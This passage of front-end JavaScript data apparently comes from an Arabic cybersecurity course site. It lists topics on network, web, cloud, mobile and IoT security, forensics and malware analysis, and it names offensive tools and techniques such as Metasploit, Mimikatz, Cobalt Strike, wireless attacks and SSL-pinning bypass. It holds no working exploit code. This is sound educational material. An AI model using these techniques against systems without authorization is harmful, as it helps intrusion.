                        "Micro-segmentation: تجزئة دقيقة على مستوى التطبيقات والـ workloads",
                        "Zero Trust Network Access (ZTNA): لا تثق بأي شيء داخل أو خارج الشبكة",
                        "Software-Defined Networking (SDN): تجزئة برمجية مرنة",
                        "Network Access Control (NAC): التحقق قبل السماح بالاتصال",
                        "الفائدة: تقليل نطاق الاختراق في حالة حدوثه (Blast Radius)",
                        "East-West Traffic Control: مراقبة حركة المرور الداخلية",
                    ],
                },
                {
                    title: "VPN والاتصالات الآمنة",
                    content: [
                        "Site-to-Site VPN: ربط فروع المؤسسة بشكل آمن (IPsec Tunnel)",
                        "Remote Access VPN: اتصال الموظفين عن بعد بشكل آمن",
                        "بروتوكولات: OpenVPN، WireGuard (الأسرع)، IPsec، L2TP، IKEv2",
                        "SSL VPN: VPN عبر HTTPS - لا يحتاج برامج خاصة",
                        "Split Tunneling: توجيه حركة معينة فقط عبر VPN (أسرع، أقل أماناً)",
                        "Full Tunneling: توجيه كل الحركة عبر VPN (أبطأ، أكثر أماناً)",
                        "Always-On VPN: اتصال تلقائي دائم للأجهزة المؤسسية",
                        "VPN Kill Switch: قطع الإنترنت إذا انقطع VPN",
                        "Double VPN / Multi-hop: المرور عبر أكثر من خادم VPN",
                        "الاعتبارات: السرعة، التشفير، الخصوصية، الموثوقية، No-Log Policy",
                    ],
                },
                {
                    title: "أمن الشبكات اللاسلكية",
                    content: [
                        "WEP: قديم وضعيف جداً - يُكسر في دقائق (لا تستخدمه أبداً)",
                        "WPA: أفضل من WEP لكنه ضعيف أيضاً (TKIP)",
                        "WPA2: المعيار الحالي - AES-CCMP (WPA2-Personal, WPA2-Enterprise)",
                        "WPA3: أحدث وأقوى - SAE (Simultaneous Authentication of Equals)",
                        "Evil Twin Attack: إنشاء نقطة وصول مزيفة بنفس الاسم",
                        "Deauthentication Attack: فصل المستخدمين لإجبارهم على إعادة الاتصال",
                        "PMKID Attack: استخراج hash بدون الحاجة لـ handshake كامل",
                        "Rogue Access Point: نقطة وصول غير مصرح بها في الشبكة",
                        "أدوات: Aircrack-ng، Wifite، Hashcat، Fluxion",
                        "الحماية: WPA3، MAC Filtering، Hidden SSID، 802.1X، Wireless IDS",
                    ],
                },
            ],
        },
        {
            icon: hg,
            title: "أمن تطبيقات الويب",
            description: "OWASP Top 10 وأفضل الممارسات لتطوير تطبيقات آمنة",
            subTopics: [
                {
                    title: "OWASP Top 10 - 2021",
                    content: [
                        "A01 - Broken Access Control: الوصول لموارد غير مصرح بها (IDOR, Privilege Escalation)",
                        "A02 - Cryptographic Failures: ضعف في التشفير وحماية البيانات الحساسة",
                        "A03 - Injection: SQL، NoSQL، LDAP، OS Command، XPath injection",
                        "A04 - Insecure Design: ثغرات في التصميم من البداية (Threat Modeling مهم)",
                        "A05 - Security Misconfiguration: إعدادات افتراضية أو خاطئة أو مكشوفة",
                        "A06 - Vulnerable Components: استخدام مكتبات قديمة أو معرضة للخطر",
                        "A07 - Authentication Failures: ضعف في المصادقة وإدارة الجلسات",
                        "A08 - Data Integrity Failures: ضعف في التحقق من سلامة البيانات (Insecure Deserialization)",
                        "A09 - Security Logging Failures: عدم كفاية التسجيل والمراقبة",
                        "A10 - SSRF: Server-Side Request Forgery - إجبار الخادم على طلبات داخلية",
                    ],
                },
                {
                    title: "التحقق من المدخلات (Input Validation)",
                    content: [
                        "Whitelist vs Blacklist: استخدم القوائم البيضاء كلما أمكن (أكثر أماناً)",
                        "Server-side Validation: لا تعتمد على التحقق في المتصفح فقط - يمكن تجاوزه",
                        "Parameterized Queries: استخدم Prepared Statements دائماً لمنع SQL Injection",
                        "Output Encoding: ترميز المخرجات حسب السياق (HTML, JS, URL, CSS)",
                        "File Upload Validation: التحقق من النوع والحجم والمحتوى (Magic Bytes)",
                        "Regular Expressions: استخدم regex دقيقة للتحقق من الصيغ المتوقعة",
                        "Canonicalization: توحيد المدخلات قبل التحقق (Path Traversal)",
                        "Input Length Limits: تحديد الحد الأقصى للمدخلات",
                        "Content-Type Validation: التحقق من نوع المحتوى المرسل",
                        "الأدوات: OWASP ESAPI، DOMPurify، Validator.js",
                    ],
                },
                {
                    title: "إدارة الجلسات والمصادقة",
                    content: [
                        "Session ID: عشوائي وطويل بما يكفي (128-bit minimum، cryptographically random)",
                        "HTTP-Only Cookies: منع JavaScript من الوصول للجلسة (XSS protection)",
                        "Secure Flag: إرسال الكوكيز عبر HTTPS فقط",
                        "SameSite Attribute: حماية من CSRF (Strict, Lax, None)",
                        "Session Timeout: انتهاء الجلسة بعد فترة عدم نشاط (15-30 دقيقة)",
                        "Absolute Timeout: انتهاء الجلسة بغض النظر عن النشاط (8 ساعات)",
                        "Session Regeneration: تجديد Session ID بعد تسجيل الدخول",
                        "MFA/2FA: المصادقة متعددة العوامل (TOTP, SMS, Hardware Keys)",
                        "Password Policy: حد أدنى للطول والتعقيد، منع كلمات المرور الشائعة",
                        "Account Lockout: قفل الحساب بعد محاولات فاشلة متعددة",
                    ],
                },
                {
                    title: "حماية APIs",
                    content: [
                        "Authentication: JWT (تحقق من signature وexpiry)، OAuth 2.0، API Keys",
                        "Authorization: التحقق من الصلاحيات لكل طلب (RBAC, ABAC)",
                        "Rate Limiting: تحديد عدد الطلبات لمنع الإساءة والـ DoS",
                        "Input Validation: التحقق من جميع المدخلات والمعلمات",
                        "HTTPS Only: تشفير جميع الاتصالات - لا HTTP أبداً",
                        "CORS Policy: تحديد المصادر المسموح لها بالوصول بدقة",
                        "API Versioning: إدارة الإصدارات وإلغاء القديم بأمان",
                        "Request Size Limits: تحديد الحد الأقصى لحجم الطلبات",
                        "API Gateway: نقطة مركزية للتحكم والمراقبة",
                        "Logging & Monitoring: تسجيل جميع الطلبات ومراقبة الأنماط المشبوهة",
                    ],
                },
                {
                    title: "أمان الـ Headers",
                    content: [
                        "Content-Security-Policy (CSP): التحكم في مصادر المحتوى ومنع XSS",
                        "X-Frame-Options: منع Clickjacking (DENY, SAMEORIGIN)",
                        "X-Content-Type-Options: منع MIME sniffing (nosniff)",
                        "Strict-Transport-Security (HSTS): فرض HTTPS (max-age, includeSubDomains)",
                        "X-XSS-Protection: حماية XSS في المتصفحات القديمة",
                        "Referrer-Policy: التحكم في معلومات المصدر المرسلة",
                        "Permissions-Policy: التحكم في APIs المتصفح (camera, microphone, geolocation)",
                        "Cache-Control: التحكم في التخزين المؤقت للبيانات الحساسة",
                        "Set-Cookie Attributes: Secure, HttpOnly, SameSite, Path, Domain",
                        "الأدوات: SecurityHeaders.com، Mozilla Observatory",
                    ],
                },
            ],
        },
        {
            icon: Ar,
            title: "أنظمة التشغيل والأدوات",
            description: "تعرف على توزيعات لينكس للأمن السيبراني وأهم الأدوات",
            subTopics: [
                {
                    title: "توزيعات لينكس للأمن السيبراني",
                    content: [
                        "Kali Linux: الأشهر والأكثر استخداماً، +600 أداة مثبتة مسبقاً، دعم ممتاز",
                        "Parrot Security OS: بديل خفيف مع تركيز على الخصوصية وأدوات تطوير",
                        "BlackArch: مبني على Arch Linux مع +2800 أداة - للمتقدمين",
                        "BackBox: مبني على Ubuntu، سهل الاستخدام للمبتدئين",
                        "Pentoo: مبني على Gentoo للمتقدمين - تخصيص عالي",
                        "CAINE: توزيعة متخصصة في التحقيق الجنائي الرقمي",
                        "Tails: توزيعة للخصوصية المطلقة - تعمل من USB",
                        "Whonix: توزيعة مبنية على Tor للخصوصية القصوى",
                        "REMnux: متخصصة في تحليل البرمجيات الخبيثة",
                        "نصيحة: ابدأ بـ Kali Linux لتوفر الدعم والتوثيق الممتاز",
                    ],
                },
                {
                    title: "أدوات فحص الشبكات",
                    content: [
                        "Nmap: الأداة الأساسية لفحص المنافذ واكتشاف الخدمات وOS detection",
                        "Masscan: أسرع ماسح منافذ في العالم، مناسب للشبكات الكبيرة (ملايين الأجهزة)",
                        "Zenmap: واجهة رسومية لـ Nmap - سهلة للمبتدئين",
                        "Angry IP Scanner: ماسح IP سريع وبسيط عبر الأنظمة",
                        "Netcat (nc): سكين الجيش السويسري للشبكات - ألف استخدام",
                        "Wireshark: تحليل حزم الشبكة بالتفصيل - الأقوى في مجاله",
                        "tcpdump: تحليل الحزم من سطر الأوامر",
                        "Hping3: أداة متقدمة لفحص TCP/IP وإنشاء حزم مخصصة",
                        "Responder: أداة LLMNR/NBT-NS/MDNS poisoning",
                        "Arp-scan: اكتشاف الأجهزة في الشبكة المحلية",
                    ],
                },
                {
                    title: "أدوات اختبار تطبيقات الويب",
                    content: [
                        "Burp Suite: الأداة الأساسية لاختبار تطبيقات الويب - Professional الأقوى",
                        "OWASP ZAP: بديل مجاني ومفتوح المصدر - ممتاز للمبتدئين",
                        "Nikto: فحص سريع لثغرات الخوادم والإعدادات الخاطئة",
                        "SQLMap: أتمتة اكتشاف واستغلال SQL Injection - قوي جداً",
                        "Dirb/Gobuster/Feroxbuster: اكتشاف الملفات والمجلدات المخفية",
                        "WPScan: فحص ثغرات WordPress بالتفصيل",
                        "Nuclei: ماسح ثغرات سريع مع قوالب جاهزة",
                        "Wfuzz: أداة fuzzing متقدمة للويب",
                        "Subfinder/Amass: اكتشاف النطاقات الفرعية",
                        "Httpx: فحص سريع لخوادم HTTP/HTTPS",
                    ],
                },
                {
                    title: "أدوات الاستغلال",
                    content: [
                        "Metasploit Framework: أشهر إطار عمل للاستغلال - آلاف الـ exploits والـ payloads",
                        "Cobalt Strike: أداة تجارية متقدمة للفريق الأحمر - $3,500/سنة",
                        "Empire: إطار عمل PowerShell للتحكم عن بعد (تم إيقافه، بدائل: Starkiller)",
                        "Mimikatz: استخراج كلمات المرور من ذاكرة Windows - أيقونة",
                        "Hashcat: أسرع أداة لكسر الهاشات باستخدام GPU",
                        "John the Ripper: أداة كلاسيكية لكسر كلمات المرور",
                        "Responder: هجمات LLMNR/NBT-NS في الشبكات المحلية",
                        "CrackMapExec: أداة شاملة لاختبار Active Directory",
                        "Impacket: مكتبة Python لبروتوكولات Windows",
                        "BloodHound: تحليل وتصور مسارات الهجوم في AD",
                    ],
                },
                {
                    title: "أدوات الهندسة العكسية وتحليل البرمجيات",
                    content: [
                        "Ghidra: أداة NSA المجانية للهندسة العكسية - قوية جداً",
                        "IDA Pro: المعيار الذهبي للهندسة العكسية (مدفوعة)",
                        "Radare2/Cutter: أداة مفتوحة المصدر مع واجهة رسومية",
                        "x64dbg/x32dbg: debugger لـ Windows",
                        "GDB: debugger لـ Linux",
                        "OllyDbg: debugger كلاسيكي لـ Windows",
                        "Binwalk: تحليل واستخراج Firmware",
                        "Strings: استخراج النصوص من الملفات الثنائية",
                        "PEiD/Detect It Easy: كشف packers وcompilers",
                        "Volatility: تحليل ذاكرة RAM للتحقيق الجنائي",
                    ],
                },
            ],
        },
        {
            icon: Rx,
            title: "القوانين والأخلاقيات",
            description: "الإطار القانوني والأخلاقي للعمل في الأمن السيبراني",
            subTopics: [
                {
                    title: "القوانين والتشريعات",
                    content: [
                        "الاختراق بدون إذن جريمة جنائية في جميع الدول تقريباً - لا استثناءات",
                        "Computer Fraud and Abuse Act (CFAA): القانون الأمريكي - عقوبات تصل لـ 20 سنة",
                        "Computer Misuse Act 1990: القانون البريطاني",
                        "قوانين الجرائم الإلكترونية العربية: تختلف حسب الدولة",
                        "GDPR: حماية البيانات الشخصية في الاتحاد الأوروبي - غرامات تصل لـ 4% من الإيرادات",
                        "HIPAA: حماية المعلومات الصحية في أمريكا",
                        "PCI DSS: معيار أمان بيانات بطاقات الدفع",
                        "SOX: قانون Sarbanes-Oxley للشركات المدرجة",
                        "العقوبات تتراوح من الغرامات المالية إلى السجن لسنوات عديدة",
                        "حتى 'الاختبار بدون قصد' قد يعتبر جريمة - احصل على إذن كتابي دائماً",
                    ],
                },
                {
                    title: "أخلاقيات الهاكر الأخلاقي",
                    content: [
                        "احصل دائماً على إذن كتابي (Written Authorization) قبل أي اختبار",
                        "Letter of Authorization/Rules of Engagement: وثيقة تحدد النطاق والقواعد",
                        "العمل ضمن النطاق المتفق عليه فقط - لا تتجاوز الحدود",
                        "الإبلاغ عن جميع الثغرات المكتشفة للعميل بشكل كامل وصادق",
                        "عدم الإضرار بالأنظمة أو البيانات - الهدف اكتشاف الثغرات لا التدمير",
                        "الحفاظ على سرية المعلومات المكتشفة - NDA ملزم قانونياً",
                        "الإفصاح المسؤول (Responsible Disclosure) للثغرات",
                        "عدم استخدام المعلومات المكتشفة لأغراض شخصية",
                        "التعاون مع فرق الأمن في المؤسسة",
                        "المحافظة على التطوير المهني والتعلم المستمر",
                    ],
                },
                {
                    title: "برامج Bug Bounty",
                    content: [
                        "HackerOne: أكبر منصة لبرامج مكافآت الثغرات (+2000 برنامج)",
                        "Bugcrowd: منصة شائعة أخرى مع مجتمع نشط",
                        "Synack: منصة مغلقة للباحثين المختارين - مكافآت أعلى",
                        "Intigriti: منصة أوروبية متنامية",
                        "Open Bug Bounty: للمواقع بدون برنامج رسمي (حذراً)",
                        "Google VRP: برنامج جوجل - مكافآت تصل لـ $31,337+",
                        "Microsoft MSRC: برنامج مايكروسوفت",
                        "نصائح: اقرأ القواعد جيداً، ابدأ بالبرامج العامة، ابني سمعة",
                        "المكافآت تتراوح من $50 إلى $1,000,000+ للثغرات الحرجة",
                        "الإبلاغ: اكتب تقارير واضحة مع PoC وخطوات إعادة الإنتاج",
                    ],
                },
                {
                    title: "الشهادات المهنية",
                    content: [
                        "CEH (Certified Ethical Hacker): شهادة أساسية شائعة من EC-Council",
                        "OSCP (Offensive Security Certified Professional): عملية ومحترمة - 24 ساعة امتحان",
                        "OSWE: متخصصة في اختبار تطبيقات الويب",
                        "OSEP: متقدمة للتهرب من الحماية والـ Red Team",
                        "CISSP: للإدارة والاستراتيجية الأمنية - 8 مجالات",
                        "CompTIA Security+: شهادة أساسية ممتازة للمبتدئين",
                        "CompTIA CySA+: تحليل الأمن السيبراني",
                        "CISM/CISA: للحوكمة والتدقيق من ISACA",
                        "GPEN/GWAPT: شهادات SANS - عالية الجودة ومكلفة",
                        "نصيحة: الشهادات مهمة لكن الخبرة العملية والـ CTFs أهم",
                    ],
                },
            ],
        },
        {
            icon: mg,
            title: "أمن السحابة (Cloud Security)",
            description: "حماية البيانات والتطبيقات في البيئات السحابية",
            subTopics: [
                {
                    title: "نماذج الحوسبة السحابية",
                    content: [
                        "IaaS (Infrastructure as a Service): البنية التحتية كخدمة - AWS EC2, Azure VMs",
                        "PaaS (Platform as a Service): المنصة كخدمة - Heroku, Google App Engine",
                        "SaaS (Software as a Service): البرمجيات كخدمة - Office 365, Salesforce",
                        "FaaS (Function as a Service): Serverless - AWS Lambda, Azure Functions",
                        "Shared Responsibility Model: العميل والمزود يتشاركون المسؤولية الأمنية",
                        "IaaS: العميل مسؤول عن كل شيء فوق hypervisor",
                        "PaaS: العميل مسؤول عن التطبيقات والبيانات",
                        "SaaS: العميل مسؤول عن البيانات والوصول فقط",
                        "Multi-tenancy: عزل البيانات بين العملاء المختلفين",
                        "Cloud-native Security: تصميم الأمان للسحابة من البداية",
                    ],
                },
                {
                    title: "أمن AWS",
                    content: [
                        "IAM (Identity and Access Management): إدارة الهويات والصلاحيات",
                        "MFA: المصادقة متعددة العوامل لجميع الحسابات",
                        "S3 Bucket Security: عدم جعل الـ buckets عامة، التشفير، Bucket Policies",
                        "VPC (Virtual Private Cloud): عزل الشبكات، Security Groups، NACLs",
                        "CloudTrail: تسجيل جميع API calls للتدقيق",
                        "GuardDuty: كشف التهديدات الذكي",
                        "Security Hub: لوحة تحكم مركزية للأمان",
                        "Config: مراقبة تغييرات الإعدادات والامتثال",
                        "KMS: إدارة مفاتيح التشفير",
                        "AWS Organizations + SCPs: التحكم في الحسابات المتعددة",
                    ],
                },
                {
                    title: "أمن Azure",
                    content: [
                        "Azure Active Directory: إدارة الهويات المركزية",
                        "Conditional Access: سياسات وصول ذكية حسب السياق",
                        "Azure Security Center (Defender for Cloud): مراقبة وتوصيات أمنية",
                        "Network Security Groups (NSGs): قواعد جدار الحماية",
                        "Azure Sentinel: SIEM سحابي متكامل",
                        "Key Vault: تخزين آمن للأسرار والمفاتيح والشهادات",
                        "Azure Policy: فرض الامتثال والإعدادات",
                        "Just-in-Time VM Access: تقليل سطح الهجوم",
                        "Private Link: اتصال خاص بدون مرور عبر الإنترنت",
                        "Azure Firewall: جدار حماية مُدار",
                    ],
                },
                {
                    title: "أمن الحاويات (Container Security)",
                    content: [
                        "Docker Security: عزل الحاويات، User Namespaces، Seccomp، AppArmor",
                        "Image Security: فحص الصور، استخدام صور رسمية موثوقة، Minimal Images",
                        "Registry Security: تأمين سجلات الصور (Harbor, ECR, ACR)",
                        "Kubernetes Security: RBAC، Network Policies، Pod Security Standards",
                        "Secrets Management: عدم تخزين الأسرار في الصور أو المتغيرات البيئية",
                        "Runtime Security: Falco، Sysdig، Aqua Security",
                        "Admission Controllers: OPA/Gatekeeper للتحقق من السياسات",
                        "Service Mesh Security: Istio، Linkerd للتشفير والمراقبة",
                        "Supply Chain Security: Cosign، SLSA للتحقق من سلسلة التوريد",
                        "Trivy، Clair، Anchore: أدوات فحص الثغرات في الصور",
                    ],
                },
            ],
        },
        {
            icon: Ku,
            title: "أمن تطبيقات الموبايل",
            description: "حماية تطبيقات الجوال على Android و iOS",
            subTopics: [
                {
                    title: "OWASP Mobile Top 10",
                    content: [
                        "M1 - Improper Platform Usage: استخدام خاطئ لميزات النظام",
                        "M2 - Insecure Data Storage: تخزين بيانات حساسة بشكل غير آمن",
                        "M3 - Insecure Communication: اتصالات غير مشفرة",
                        "M4 - Insecure Authentication: ضعف في المصادقة",
                        "M5 - Insufficient Cryptography: تشفير ضعيف أو تطبيق خاطئ",
                        "M6 - Insecure Authorization: ضعف في التفويض",
                        "M7 - Client Code Quality: ثغرات في كود التطبيق",
                        "M8 - Code Tampering: التلاعب بالتطبيق",
                        "M9 - Reverse Engineering: الهندسة العكسية للتطبيق",
                        "M10 - Extraneous Functionality: وظائف تطوير متروكة في الإنتاج",
                    ],
                },
                {
                    title: "أمن Android",
                    content: [
                        "APK Structure: AndroidManifest.xml، classes.dex، resources",
                        "Decompilation: apktool، jadx، dex2jar لفك التجميع",
                        "Root Detection Bypass: Frida، Magisk Hide، objection",
                        "SSL Pinning Bypass: Frida scripts، objection",
                        "Insecure Storage: SharedPreferences، SQLite databases غير مشفرة",
                        "Intent Vulnerabilities: Broadcast receivers، Deep links",
                        "WebView Security: JavaScript injection، File access",
                        "Drozer: أداة اختبار أمان Android",
                        "MobSF: تحليل ثابت وديناميكي للتطبيقات",
                        "Burp Suite Mobile Assistant: اعتراض حركة التطبيقات",
                    ],
                },
                {
                    title: "أمن iOS",
                    content: [
                        "IPA Structure: Info.plist، executable، frameworks",
                        "Jailbreak Detection: checkra1n، unc0ver، Palera1n",
                        "Keychain Security: تخزين آمن للبيانات الحساسة",
                        "Data Protection Classes: مستويات الحماية المختلفة",
                        "App Transport Security (ATS): فرض HTTPS",
                        "Binary Analysis: class-dump، Hopper، IDA",
                        "Frida for iOS: Instrumentation وتعديل السلوك",
                        "objection: أتمتة اختبار الأمان",
                        "Cycript: تفاعل مع تطبيقات iOS أثناء التشغيل",
                        "iMazing، 3uTools: استخراج وتحليل التطبيقات",
                    ],
                },
                {
                    title: "تقنيات الحماية",
                    content: [
                        "Certificate Pinning: ربط التطبيق بشهادة معينة لمنع MITM",
                        "Code Obfuscation: تشويش الكود لصعوبة الهندسة العكسية (ProGuard، R8)",
                        "Anti-Tampering: كشف التعديل على التطبيق",
                        "Root/Jailbreak Detection: اكتشاف الأجهزة المعدلة",
                        "Secure Storage: Android Keystore، iOS Keychain",
                        "Biometric Authentication: Face ID، Touch ID، Fingerprint",
                        "Runtime Application Self-Protection (RASP): حماية أثناء التشغيل",
                        "Device Binding: ربط التطبيق بجهاز معين",
                        "Emulator Detection: اكتشاف المحاكيات",
                        "Dynamic Loading: تحميل أجزاء حساسة من الخادم",
                    ],
                },
            ],
        },
        {
            icon: vg,
            title: "أمن إنترنت الأشياء (IoT Security)",
            description: "حماية الأجهزة المتصلة والأنظمة الذكية",
            subTopics: [
                {
                    title: "تحديات أمن IoT",
                    content: [
                        "موارد محدودة: ذاكرة ومعالجة قليلة تمنع التشفير القوي",
                        "تحديثات صعبة: كثير من الأجهزة لا تُحدث أبداً",
                        "Default Credentials: كلمات مرور افتراضية لا تُغير (admin:admin)",
                        "عمر طويل: أجهزة تعمل لسنوات بدون دعم",
                        "تنوع كبير: آلاف المصنعين والبروتوكولات",
                        "Physical Access: الأجهزة قد تكون في أماكن غير آمنة",
                        "Lack of Standards: غياب معايير أمان موحدة",
                        "Supply Chain: ثغرات في مكونات الطرف الثالث",
                        "Botnets: Mirai وأمثاله استغلوا ملايين الأجهزة",
                        "Privacy Concerns: جمع بيانات ضخمة من المستخدمين",
                    ],
                },
                {
                    title: "هجمات IoT الشائعة",
                    content: [
                        "Default Password Attacks: استخدام كلمات المرور الافتراضية",
                        "Firmware Attacks: استخراج وتحليل واستغلال الـ firmware",
                        "JTAG/UART Attacks: الوصول عبر منافذ التصحيح",
                        "Side-Channel Attacks: استخراج معلومات من الاستهلاك الكهربائي أو الإشعاع",
                        "Replay Attacks: إعادة إرسال أوامر مسجلة",
                        "Man-in-the-Middle: اعتراض الاتصالات",
                        "Zigbee/Z-Wave Attacks: هجمات على بروتوكولات المنزل الذكي",
                        "Bluetooth Attacks: BlueBorne، Bluesnarfing، Bluebugging",
                        "RF Attacks: اعتراض إشارات الراديو (أجهزة التحكم، السيارات)",
                        "Botnet Recruitment: تجنيد الأجهزة في شبكات الروبوت",
                    ],
                },
                {
                    title: "أدوات اختبار IoT",
                    content: [
                        "Binwalk: استخراج وتحليل Firmware",
                        "Firmware-mod-kit: تعديل Firmware",
                        "Flashrom: قراءة وكتابة شرائح Flash",
                        "OpenWRT: نظام تشغيل مفتوح للراوترات",
                        "Shodan/Censys: البحث عن أجهزة IoT المكشوفة",
                        "Wireshark: تحليل بروتوكولات IoT",
                        "Ubertooth: تحليل Bluetooth",
                        "HackRF/RTL-SDR: تحليل إشارات الراديو",
                        "Bus Pirate: تحليل واجهات الأجهزة (I2C، SPI، UART)",
                        "Attify Badge: أداة شاملة لاختبار IoT",
                    ],
                },
                {
                    title: "حماية أجهزة IoT",
                    content: [
                        "تغيير كلمات المرور الافتراضية فوراً",
                        "التحديثات التلقائية للـ Firmware",
                        "تجزئة الشبكة: عزل أجهزة IoT في VLAN منفصلة",
                        "Secure Boot: التحقق من سلامة الـ firmware قبل التشغيل",
                        "Encrypted Communications: TLS/DTLS لجميع الاتصالات",
                        "Mutual Authentication: التحقق المتبادل بين الجهاز والخادم",
                        "Hardware Security Modules: حماية المفاتيح",
                        "Firmware Signing: توقيع التحديثات رقمياً",
                        "Disable Unused Services: تعطيل الخدمات غير المستخدمة",
                        "Regular Security Audits: فحوصات أمنية دورية",
                    ],
                },
            ],
        },
        {
            icon: br,
            title: "التحقيق الجنائي الرقمي (Digital Forensics)",
            description: "تحليل الأدلة الرقمية والتحقيق في الحوادث الأمنية",
            subTopics: [
                {
                    title: "أساسيات التحقيق الجنائي",
                    content: [
                        "تعريف: جمع وتحليل وحفظ الأدلة الرقمية بطريقة مقبولة قانونياً",
                        "Chain of Custody: توثيق تسلسل حيازة الأدلة",
                        "Order of Volatility: جمع الأدلة الأكثر تقلباً أولاً (RAM → Disk)",
                        "Integrity: الحفاظ على سلامة الأدلة (Write Blockers، Hashing)",
                        "Documentation: توثيق كل خطوة بالتفصيل",
                        "Legal Considerations: الامتثال للقوانين المحلية والدولية",
                        "Anti-Forensics: تقنيات يستخدمها المجرمون لإخفاء الأدلة",
                        "Timeline Analysis: ترتيب الأحداث زمنياً",
                        "Artifact Analysis: تحليل البقايا الرقمية",
                        "Reporting: كتابة تقارير واضحة للمحاكم أو الإدارة",
                    ],
                },
                {
                    title: "تحقيق أنظمة Windows",
                    content: [
                        "Registry Analysis: HKLM، HKCU، NTUSER.DAT، SAM",
                        "Event Logs: Security، System، Application logs",
                        "Prefetch Files: دليل على تشغيل البرامج",
                        "LNK Files: اختصارات تكشف الملفات المستخدمة",
                        "Jump Lists: قوائم الملفات الأخيرة لكل تطبيق",
                        "Browser Artifacts: History، Cookies، Cache، Downloads",
                        "Shellbags: دليل على المجلدات التي تم الوصول إليها",
                        "NTFS Artifacts: $MFT، $LogFile، $UsnJrnl",
                        "Memory Analysis: استخراج العمليات والاتصالات من RAM",
                        "أدوات: FTK، EnCase، Autopsy، Volatility",
                    ],
                },
                {
                    title: "تحقيق أنظمة Linux",
                    content: [
                        "Log Files: /var/log/auth.log، syslog، messages",
                        "User History: .bash_history، .zsh_history",
                        "File System: ext4 journal، deleted files",
                        "Process Information: /proc filesystem",
                        "Network Connections: netstat، ss، /proc/net",
                        "Cron Jobs: scheduled tasks المجدولة",
                        "Installed Packages: dpkg، rpm logs",
                        "User Accounts: /etc/passwd، /etc/shadow",
                        "SSH Artifacts: authorized_keys، known_hosts",
                        "أدوات: Sleuth Kit، Autopsy، dc3dd، log2timeline",
                    ],
                },
                {
                    title: "تحليل الذاكرة (Memory Forensics)",
                    content: [
                        "أهمية RAM: تحتوي على بيانات غير موجودة على القرص",
                        "Memory Acquisition: DumpIt، FTK Imager، LiME للـ Linux",
                        "Volatility Framework: الأداة الأساسية لتحليل الذاكرة",
                        "Process Analysis: العمليات الجارية والمخفية",
                        "Network Connections: الاتصالات النشطة",
                        "Injected Code: كود محقون في العمليات",
                        "Registry in Memory: مفاتيح الريجستري",
                        "Passwords & Keys: كلمات مرور ومفاتيح تشفير",
                        "Malware Artifacts: آثار البرمجيات الخبيثة",
                        "YARA Rules: اكتشاف أنماط البرمجيات الخبيثة",
                    ],
                },
            ],
        },
        {
            icon: Tx,
            title: "تحليل البرمجيات الخبيثة",
            description: "فهم وتحليل الفيروسات والبرمجيات الضارة",
            subTopics: [
                {
                    title: "أنواع البرمجيات الخبيثة",
                    content: [
                        "Viruses: تحتاج لملف مضيف وتنتشر عند التنفيذ",
                        "Worms: تنتشر ذاتياً عبر الشبكة بدون تدخل",
                        "Trojans: تتنكر كبرامج شرعية",
                        "Ransomware: تشفير الملفات وطلب فدية (WannaCry، NotPetya، LockBit)",
                        "Spyware: تجسس وسرقة معلومات",
                        "Adware: عرض إعلانات مزعجة",
                        "Rootkits: إخفاء وجود البرمجيات الخبيثة (Kernel، User-mode)",
                        "Bootkits: إصابة boot sector قبل نظام التشغيل",
                        "Fileless Malware: تعمل في الذاكرة فقط",
                        "RAT (Remote Access Trojan): تحكم عن بعد كامل",
                    ],
                },
                {
                    title: "التحليل الثابت (Static Analysis)",
                    content: [
                        "تعريف: تحليل الملف بدون تشغيله",
                        "File Hashing: MD5، SHA256 للتعريف والمقارنة",
                        "VirusTotal: فحص بعشرات محركات مكافحة الفيروسات",
                        "Strings Analysis: استخراج النصوص والمؤشرات",
                        "PE Analysis: فحص هيكل ملفات Windows (headers، sections، imports)",
                        "Packer Detection: كشف التغليف والتشويش (UPX، Themida)",
                        "Import Analysis: الدوال المستوردة تكشف السلوك",
                        "Disassembly: تحويل لـ Assembly (IDA، Ghidra)",
                        "Decompilation: إعادة بناء الكود المصدري",
                        "YARA Rules: كتابة قواعد للكشف",
                    ],
                },
                {
                    title: "التحليل الديناميكي (Dynamic Analysis)",
                    content: [
                        "تعريف: تشغيل البرمجية في بيئة معزولة ومراقبتها",
                        "Sandboxing: ANY.RUN، Cuckoo، Joe Sandbox، Hybrid Analysis",
                        "Process Monitoring: Process Monitor، Process Explorer",
                        "File System Monitoring: تتبع الملفات المُنشأة والمُعدلة",
                        "Registry Monitoring: تتبع تغييرات الريجستري",
                        "Network Monitoring: Wireshark، Fiddler، INetSim",
                        "API Monitoring: تتبع استدعاءات النظام (API Monitor)",
                        "Debugging: x64dbg، OllyDbg للتحليل التفاعلي",
                        "Memory Dumps: تحليل الذاكرة أثناء التشغيل",
                        "Behavioral Indicators: تحديد مؤشرات السلوك (IOCs)",
                    ],
                },
                {
                    title: "مؤشرات الاختراق (Indicators of Compromise)",
                    content: [
                        "File Indicators: Hashes، أسماء ملفات، مسارات",
                        "Network Indicators: IPs، Domains، URLs",
                        "Host Indicators: Registry keys، Services، Scheduled tasks",
                        "Behavioral Indicators: أنماط سلوك معينة",
                        "STIX/TAXII: معايير تبادل معلومات التهديدات",
                        "Threat Intelligence Platforms: MISP، OpenCTI، ThreatConnect",
                        "IOC Sharing: تبادل المؤشرات مع المجتمع الأمني",
                        "YARA Rules: قواعد للكشف عن البرمجيات الخبيثة",
                        "Sigma Rules: قواعد للكشف في السجلات",
                        "Snort/Suricata Rules: قواعد للكشف في الشبكة",
                    ],
                },
            ],
        },
        {
            icon: kg,
            title: "الفريق الأحمر والأزرق (Red/Blue Team)",
            description: "فهم أدوار الهجوم والدفاع في الأمن السيبراني",
            subTopics: [
                {
                    title: "الفريق الأحمر (Red Team)",
                    content: [
                        "تعريف: محاكاة هجمات حقيقية لاختبار دفاعات المؤسسة",
                        "الفرق عن Pentest: أوسع نطاقاً، أطول مدة، يشمل الهندسة الاجتماعية والفيزيائي",
                        "Objectives: تحقيق أهداف محددة (سرقة بيانات، الوصول لـ Domain Admin)",
                        "TTPs: Tactics, Techniques, Procedures المستخدمة",
                        "MITRE ATT&CK: إطار عمل لتصنيف التكتيكات والتقنيات",
                        "C2 (Command & Control): Cobalt Strike، Covenant، Sliver",
                        "Evasion: تجاوز أنظمة الحماية (AV، EDR)",
                        "Phishing Campaigns: حملات تصيد لاختبار الموظفين",
                        "Physical Testing: اختبار الأمن الفيزيائي",
                        "Reporting: تقرير شامل بالنتائج والتوصيات",
                    ],
                },
                {
                    title: "الفريق الأزرق (Blue Team)",
                    content: [
